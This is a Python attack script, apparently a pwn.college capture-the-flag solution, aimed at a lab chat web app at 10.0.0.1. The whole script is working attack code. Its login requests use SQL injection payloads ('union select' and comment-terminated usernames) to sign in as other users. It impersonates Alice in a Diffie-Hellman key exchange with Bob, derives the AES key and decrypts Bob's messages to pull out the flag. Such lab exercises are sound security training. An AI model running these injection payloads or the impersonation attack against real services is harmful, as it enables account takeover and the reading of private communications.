#!/usr/bin/python3
import os
import requests
import re
from Crypto.Util.Padding import pad,unpad
from Crypto.Cipher import AES
import time

url = "http://10.0.0.1"
p = int.from_bytes(bytes.fromhex(
    "FFFFFFFF FFFFFFFF C90FDAA2 2168C234 C4C6628B 80DC1CD1 "
    "29024E08 8A67CC74 020BBEA6 3B139B22 514A0879 8E3404DD "
    "EF9519B3 CD3A431B 302B0A6D F25F1437 4FE1356D 6D51C245 "
    "E485B576 625E7EC6 F44C42E9 A637ED6B 0BFF5CB6 F406B7ED "
    "EE386BFB 5A899FA5 AE9F2411 7C4B1FE6 49286651 ECE45B3D "
    "C2007CB8 A163BF05 98DA4836 1C55D39A 69163FA8 FD24CF5F "
    "83655D23 DCA3AD96 1C62F356 208552BB 9ED52907 7096966D "
    "670C354E 4ABC9804 F1746C08 CA18217C 32905E46 2E36CE3B "
    "E39E772C 180E8603 9B2783A2 EC07A28F B5C55DF0 6F4C52C9 "
    "DE2BCBF6 95581718 3995497C EA956AE5 15D22618 98FA0510 "
    "15728E5A 8AACAA68 FFFFFFFF FFFFFFFF"
), "big")
g = 2

a = int.from_bytes(os.urandom(256),"big")
A = pow(g,a,p)


def post_key():
    session = requests.Session()
    data ={
"username":"ball' union select 'alice','r',0 --'",
"password":"hello"
    }
    session.post(url+"/login",data = data)
    r = session.post(url+"/chat/bob",data={"message":f"Hey Bob, I need to chat with you about something important. Let's chat securely over DHE-AES: {A}."})
post_key()

def capture_key():
    session = requests.Session()
    data = {"username":"ball' union select 'alice','a',0 --","password":"pas"}
    session.post(url+"/login",data=data)
    B_re = re.compile(r"^bob: Hey Alice, sure: (\d+)\.$", re.MULTILINE)
    while True:
        response = session.get("http://10.0.0.1/chat/bob")
        if match := B_re.search(response.text):
            break
        time.sleep(1)
    B = int(match.group(1))
    return B

r = requests.Session()
r.post(url+"/login",data={"username":"mallory' --","password":"hello"})
r.post(url+"/chat/alice",data={"message":"I heard someone shared the flag with Bob!"})

B = capture_key()
s = pow(B,a,p)
key = s.to_bytes(256,"big")[:16]
cipher = AES.new(key,AES.MODE_ECB)
encrypt = lambda data: cipher.encrypt(pad(data.encode(),cipher.block_size)).hex()
decrypt = lambda data: unpad(cipher.decrypt(bytes.fromhex(data)),cipher.block_size).decode()


def post_final():
    session = requests.Session()
    data ={
"username":"ball' union select 'alice','r',0 --'",
"password":"hello"
    }
    session.post(url+"/login",data = data)
    data = encrypt("Hey Bob, I know that someone shared the flag with you. Who was it?")
    r = session.post(url+"/chat/bob",data={"message":data})
post_final()

time.sleep(3)

def flag():
    session = requests.Session()
    data ={
"username":"ball' union select 'alice','r',0 --'",
"password":"hello"
    }
    session.post(url+"/login",data = data)
    encrypted_message_re = re.compile(r"^bob: ([0-9a-f]+)$", re.MULTILINE)
    while True:
        response = session.get(f"{url}/chat/bob")
        encrypted_messages = encrypted_message_re.findall(response.text)
#        print(encrypted_messages)
        for em in encrypted_messages:
            if "pwn.college" in decrypt(em):
                print(decrypt(em))
                os._exit(1)
        time.sleep(1)

flag()
